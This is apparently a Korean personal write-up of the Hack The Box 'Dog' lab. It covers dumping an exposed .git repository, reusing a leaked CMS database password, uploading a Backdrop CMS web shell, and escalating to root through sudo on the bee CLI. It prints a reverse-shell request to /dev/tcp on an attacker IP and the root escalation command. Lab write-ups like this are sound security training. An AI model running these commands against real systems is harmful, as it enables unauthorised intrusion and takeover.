---
slug: "dog"
title: "dog"
date: 2026-07-21
category: "HTB"
tags: []
excerpt: "그리고 gobuster 결과가 개많이 나왔음 ![[Pasted image 20260721145818.png|455]] ##### Initial Foothold 벡터: 노출된…"
readingTime: 5
---

#### Box: Dog | Linux | Easy
날짜: 
소요시간: 

##### Open Ports
22
80
##### Interesting Services
80포트
-> robots.txt 열려있음
-> .git 열려있음
-> backdropcms 라는 거에서 생성된 사이트라고 함 -> 일단 backdropcms 버전을 .git에서 보는게 좋을듯?

그리고 gobuster 결과가 개많이 나왔음
![[Pasted image 20260721145818.png|455]]
##### Initial Foothold
벡터: 노출된 `.git` → 크레덴셜 탈취 → CMS 로그인 → 인증 후 RCE로 웹쉘
명령어:
디렉토리들을 하나씩 들어가보면서 정보를 찾음

`/core/themes/stark/stark.info` 파일을 보니 얘가 `backdrop cms 1.27.1` 버전을 사용중이라는 것을 알 수 있었음
-> CMS는 `contents manage system`의 약자
![[Pasted image 20260721145930.png]]
마침 이 버전에 [RCE 취약점](https://www.exploit-db.com/exploits/52021)이 있다고 함
근데 이게 일단 로그인을 해야 되는 취약점이라 CVE는 못받음

```sh
#일단 .git dump 뜨고
git-dumper http://10.129.9.200/.git/ ./dumped

#커밋 로그 확인
git log --all                                                 
> commit 8204779c764abd4c9d8d95038b6d22b6a7515afa (HEAD, master)
> Author: root <dog@dog.htb>
> Date:   Fri Feb 7 21:22:11 2025 +0000
```
이 Backdrop CMS는 
settings.php 파일에 db 크레덴셜이 박혀 있다고 함
```sh
git show 8204779c764abd4c9d8d95038b6d22b6a7515afa:settings.php
> $database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';
```

그런데 이걸로는 로그인이 안됨 음,,,,, username을 찾아보는게 좋을 듯함
```sh
git show 8204779c764abd4c9d8d95038b6d22b6a7515afa | grep dog.htb
```
![[Pasted image 20260721192018.png|406]]
-> `tiffany:BackDropJ2024DS2024`
이걸로 로그인 성공

이제 위에서 본 exploit을 이용해서 리버스쉘을 실행해볼거임
![[Pasted image 20260721192650.png]]
-> 여기서 나온 zip 파일을 웹에 install 시키면 되는데 이 웹앱에선 zip을 안받는다고 함
![[Pasted image 20260721192428.png|407]]
시키는데로 익스플로잇으로 생성된 디렉토리를 tar로 재압축 후에 다시 install
```sh
tar cvf shell.tar shell

nc -lnvp 5555
```

해당 url로 접속
```
http://10.129.9.200/modules/shell/shell.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.10.14.28/5555%200%3E%261%27`
```
![[Pasted image 20260721192915.png|541]]
![[Pasted image 20260721193110.png]]
-> 근데 읽어지지가 않음 웹쉘이라 그런듯 함.

혹시 몰라서 
![[Pasted image 20260721193234.png|444]]
해보니까 성공했고 답답하니까 쉘 업그레이드 ㄱㄱ 
```
script -qc bash /dev/null

cat user.txt
```
-> **user.txt :** 81c60ccfcb7323c77ba940b81fbbdff0
##### Privilege Escalation
벡터: `sudo`로 `bee` 무제한 실행 → `bee eval`로 PHP `system()` 호출 → root 쉘
명령어:
```sh
sudo -l
> /usr/local/bin/bee
```
bee는 [Backdrop cms](https://github.com/backdrop-contrib/bee)의 CLI 라고 함
[sudo "bee" cli privesc](https://www.hackingdream.net/2020/03/linux-privilege-escalation-techniques.html) : 검색해보니까 이런 사이트가 있었고
![[Pasted image 20260721193759.png|449]]
그래서 이걸 그대로 해봄
```sh
sudo /usr/local/bin/bee --root=/var/www/html eval "system('/bin/bash');"
```
![[Pasted image 20260721193850.png|344]]
> **root.txt :** 3eaf8499ab8ee6461ece9ca12983f806
##### Rabbit Hole (막혔던 것)

##### 다음 박스에서 써먹을 것
 - `<프레임워크명> settings file` / `config location` / `default credentials` 이런식으로 검색하기
- 구글링 `" " / site:` 이런거 잘 이용하기